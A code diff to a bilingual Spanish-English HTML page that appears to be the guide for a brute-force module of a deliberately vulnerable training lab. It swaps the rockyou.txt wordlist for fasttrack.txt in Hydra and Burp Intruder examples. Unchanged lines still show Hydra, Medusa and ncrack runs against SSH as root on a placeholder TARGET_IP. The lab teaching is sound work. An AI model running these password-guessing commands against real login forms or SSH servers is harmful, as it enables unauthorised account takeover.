@@ -133,18 +133,18 @@
     <h3>Herramientas</h3>
     <div class="mb-3"><span class="tools-badge">hydra</span> <span class="tools-badge">medusa</span> <span class="tools-badge">ncrack</span> <span class="tools-badge">crackmapexec</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Metasploit</span></div>
     <h4>HTTP Login — Hydra</h4>
-    <pre><code class="language-bash"># Con deploy.sh / Docker (puerto 80):
-hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+    <pre><code class="language-bash"># Con deploy.sh / Docker (puerto 80) — acaba en segundos:
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
   TARGET_IP http-post-form \
   "/bruteforce/login:username=^USER^&password=^PASS^:Credenciales incorrectas" -t 64
 
 # En local sin Docker (puerto 5000):
-hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
   TARGET_IP -s 5000 http-post-form \
   "/bruteforce/login:username=^USER^&password=^PASS^:Credenciales incorrectas" -t 64</code></pre>
     <h4>HTTP Login — Burp Suite Intruder</h4>
     <pre><code class="language-bash"># POST /bruteforce/login → Intruder → Sniper → mark §password§
-# Payloads: Simple list → rockyou.txt → Launch → ordenar por longitud</code></pre>
+# Payloads: Simple list → fasttrack.txt → Launch → ordenar por longitud</code></pre>
     <h4>SSH — Hydra / Medusa / ncrack</h4>
     <pre><code class="language-bash">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
 medusa -h TARGET_IP -u root -P rockyou.txt -M ssh
@@ -196,18 +196,18 @@ run</code></pre>
     <h3>Tools</h3>
     <div class="mb-3"><span class="tools-badge">hydra</span> <span class="tools-badge">medusa</span> <span class="tools-badge">ncrack</span> <span class="tools-badge">crackmapexec</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Metasploit</span></div>
     <h4>HTTP Login — Hydra</h4>
-    <pre><code class="language-bash"># With deploy.sh / Docker (port 80):
-hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+    <pre><code class="language-bash"># With deploy.sh / Docker (port 80) — finishes in seconds:
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
   TARGET_IP http-post-form \
   "/bruteforce/login:username=^USER^&password=^PASS^:Credenciales incorrectas" -t 64
 
 # Local without Docker (port 5000):
-hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
   TARGET_IP -s 5000 http-post-form \
   "/bruteforce/login:username=^USER^&password=^PASS^:Credenciales incorrectas" -t 64</code></pre>
     <h4>HTTP Login — Burp Suite Intruder</h4>
     <pre><code class="language-bash"># POST /bruteforce/login → Intruder → Sniper → mark §password§
-# Payloads: Simple list → rockyou.txt → Launch → sort by length</code></pre>
+# Payloads: Simple list → fasttrack.txt → Launch → sort by length</code></pre>
     <h4>SSH — Hydra / Medusa / ncrack</h4>
     <pre><code class="language-bash">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
 medusa -h TARGET_IP -u root -P rockyou.txt -M ssh
